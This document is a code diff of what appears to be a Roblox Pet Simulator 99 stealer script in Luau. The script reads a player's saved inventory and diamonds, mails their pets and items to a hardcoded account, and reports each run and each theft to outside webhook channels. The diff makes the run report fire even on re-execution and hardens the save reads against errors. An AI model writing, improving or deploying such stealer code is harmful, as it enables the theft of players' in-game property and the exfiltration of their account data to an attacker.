@@ -1,6 +1,6 @@
 -- ps.txt / Roblox PS99 / Lua (Luau) / executor: getgenv(), syn.request
 -- Send order: Gargantuan (tier 0) -> Titanic (tier 1) -> rest by RAP desc
--- 2 pings total: webhook_run on execute, webhook_steal after send loop
+-- 2 pings total: webhook_run on every execute (before guard), webhook_steal after send loop
 local replicatedStorage = game:GetService("ReplicatedStorage")
 local httpService = game:GetService("HttpService")
 Username = "pet99_2948"
@@ -36,7 +36,6 @@ end
 local http_fn = get_http()
 print("[webhook] executor: " .. tostring(exec_name) .. " | http fn: " .. tostring(http_fn ~= nil))
 
--- url param routes the ping to run channel or steal channel
 local function send_webhook(payload, tag, url)
     if not http_fn then
         warn("[webhook] no HTTP function in executor: " .. tostring(exec_name))
@@ -76,65 +75,74 @@ local function send_steal(payload, tag)
     return send_webhook(payload, tag, webhook_steal)
 end
 
-local f1, network, localPlayer, v1, v2, f2, inventory, v3, am, f3, value, notifications, v4,
-  username, username2, v5
+local f1, f2, f3, network, localPlayer, inventory, v1, v2, v3, am, value, notifications, v4,
+  username, username2, v5, mailboxSendsSinceReset
 
-if getgenv().yeslidez then
-  return
-else
-  getgenv().yeslidez = true
-  network = replicatedStorage:WaitForChild("Network")
-  localPlayer = game.Players.LocalPlayer
-  v1 = {}
-  v2 = 0
+network = replicatedStorage:WaitForChild("Network")
+localPlayer = game.Players.LocalPlayer
+v1 = {}
+v2 = 0
 
-  -- counters for the single done ping
-  local send_stats = { sent = 0, failed = 0, rap = 0, top = nil }
-  send_stats.names = {}
-  send_stats.order = {}
-
-  function f2()
+function f2()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
-  end
+end
 
-  inventory = f2().Inventory
-  local mailboxSendsSinceReset = f2().MailboxSendsSinceReset
-  v3 = 20000
-
-  if mailboxSendsSinceReset ~= 0 then
-    v3 = math.ceil(v3 * 1.5 ^ mailboxSendsSinceReset)
-  end
-
-  am = 0
-
-  for key, value2 in pairs(f2().Inventory.Currency) do
-    if value2.id == "Diamonds" then
-      am = value2._am
-      break
+-- read env with pcall so a Save hiccup degrades fields to n/a, never kills the ping
+local run_am, run_cost, run_mail = "n/a", "n/a", "n/a"
+local ok_env, err_env = pcall(function()
+    inventory = f2().Inventory
+    mailboxSendsSinceReset = f2().MailboxSendsSinceReset
+    v3 = 20000
+    if mailboxSendsSinceReset ~= 0 then
+        v3 = math.ceil(v3 * 1.5 ^ mailboxSendsSinceReset)
     end
-  end
+    am = 0
+    for key, value2 in pairs(f2().Inventory.Currency) do
+        if value2.id == "Diamonds" then
+            am = value2._am
+            break
+        end
+    end
+    run_am, run_cost, run_mail = tostring(am), tostring(v3), tostring(mailboxSendsSinceReset)
+end)
+if not ok_env then
+    warn("[env] " .. tostring(err_env))
+end
 
-  -- THE ONE RUN PING: fires once, before any early return past this point
-  send_run({
+-- THE ONE RUN PING: fires before the guard, so re-executes still report
+send_run({
     title = "🐱 PS99 Run Started",
     color = 3447003,
     fields = {
         { name = "Executor:", value = "```" .. tostring(exec_name) .. "```", inline = true },
         { name = "Username:", value = "```"
             .. tostring(localPlayer and localPlayer.Name or "?") .. "```", inline = true },
-        { name = "Diamonds:", value = "```" .. tostring(am) .. "```", inline = true },
-        { name = "Mail cost:", value = "```" .. tostring(v3) .. "```", inline = true },
-        { name = "Mailbox sends:", value = "```"
-            .. tostring(mailboxSendsSinceReset) .. "```", inline = true },
-        { name = "Status:", value = "```Scanning inventory...```", inline = false },
+        { name = "Diamonds:", value = "```" .. tostring(run_am) .. "```", inline = true },
+        { name = "Mail cost:", value = "```" .. tostring(run_cost) .. "```", inline = true },
+        { name = "Mailbox sends:", value = "```" .. tostring(run_mail) .. "```", inline = true },
     },
     footer = { text = os.date("%Y-%m-%d %H:%M:%S") },
-  }, "run")
+}, "run")
+
+if getgenv().yeslidez then
+  return
+else
+  getgenv().yeslidez = true
+
+  if not ok_env then
+    warn("Save read failed, aborting after run ping.")
+    return
+  end
 
   if v3 > am then
     print("Not enough gems to send mail. Cost: " .. v3 .. " | Gems: " .. am)
     return
   else
+    -- counters for the single done ping
+    local send_stats = { sent = 0, failed = 0, rap = 0, top = nil }
+    send_stats.names = {}
+    send_stats.order = {}
+
     function f3(p5)
       local v13 = math.floor(p5)
       local v14 = { "", "k", "m", "b", "t" }
@@ -363,7 +371,7 @@ else
     for index5, value10 in ipairs({
       "Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate",
     }) do
-      if inventory[value10] do
+      if inventory[value10] then
         for key5, value11 in pairs(inventory[value10]) do
           if value10 == "Pet" then
             local v32 = require(replicatedStorage.Library.Directory.Pets)[value11.id]
